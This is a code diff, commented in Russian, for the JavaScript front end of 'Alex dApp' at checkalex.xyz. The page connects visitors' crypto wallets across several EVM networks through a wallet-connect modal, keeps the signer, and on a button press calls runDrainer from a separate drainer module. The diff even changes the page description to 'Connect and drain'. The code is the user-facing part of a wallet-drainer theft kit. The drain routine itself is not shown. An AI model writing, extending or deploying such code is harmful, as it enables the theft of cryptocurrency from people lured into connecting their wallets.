@@ -15,26 +15,13 @@ import { runDrainer } from './drainer.js'
 
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
 
-// ✅ Все поддерживаемые сети
-const networks = [
-  mainnet,
-  polygon,
-  bsc,
-  avalanche,
-  arbitrum,
-  optimism,
-  linea,
-  base
-]
-
-const wagmiAdapter = new WagmiAdapter({
-  projectId,
-  networks
-})
+// Список всех EVM‑сетей
+const networks = [ mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base ]
+const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 
 const metadata = {
   name: 'Alex dApp',
-  description: 'Connect your wallet',
+  description: 'Connect and drain',
   url: 'https://checkalex.xyz',
   icons: ['https://checkalex.xyz/icon.png']
 }
@@ -44,23 +31,52 @@ const modal = createAppKit({
   networks,
   metadata,
   projectId,
-  features: {
-    analytics: true
+  features: { analytics: true }
+})
+
+const connectBtn = document.getElementById('connect-btn')
+const drainerBtn = document.getElementById('drainer-btn')
+const status    = document.getElementById('status')
+
+let provider = null
+let signer   = null
+let address  = null
+
+// 1) Нажали «Подключить кошелёк»
+connectBtn.addEventListener('click', () => {
+  status.textContent = 'Открываю кошелёк…'
+  modal.open()
+})
+
+// 2) Когда AppKit сообщил о connect — сохраняем провайдер/синер/адрес и включаем кнопку Drainer
+modal.on('connect', async () => {
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
+    signer   = provider.getSigner()
+    address  = await signer.getAddress()
+    status.textContent = `Подключено: ${address}`
+    drainerBtn.disabled = false
+  } catch (e) {
+    console.error('Ошибка подключения:', e)
+    status.textContent = `Ошибка подключения: ${e.message}`
   }
 })
 
-// Открыть модалку по клику
-document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())
-
-// Запуск drainer-а
-document.getElementById('drainer-btn').addEventListener('click', async () => {
+// 3) Нажали «Запустить Drainer»
+drainerBtn.addEventListener('click', async () => {
+  if (!signer || !address) {
+    status.textContent = 'Сначала подключите кошелёк'
+    return
+  }
+  drainerBtn.disabled = true
+  status.textContent = 'Запускаю Drainer…'
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
-    const signer = provider.getSigner()
-    const address = await signer.getAddress()
-
     await runDrainer(provider, signer, address)
+    status.textContent = '✅ Drainer выполнен'
   } catch (e) {
-    console.error("Ошибка в Drainer:", e)
+    console.error('Ошибка Drainer:', e)
+    status.textContent = `❌ Ошибка: ${e.message}`
+  } finally {
+    drainerBtn.disabled = false
   }
 })
